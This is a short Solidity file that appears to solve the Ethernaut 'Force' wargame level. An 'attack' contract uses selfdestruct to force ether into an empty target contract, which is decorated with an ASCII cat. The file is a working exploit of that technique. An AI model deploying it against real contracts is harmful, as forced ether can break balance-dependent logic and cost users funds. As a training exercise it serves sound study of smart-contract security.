// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
contract attack{
  constructor() public payable{

  }
  function att(address payable add)public payable
  {
     selfdestruct(add);//强制转账
  }
}
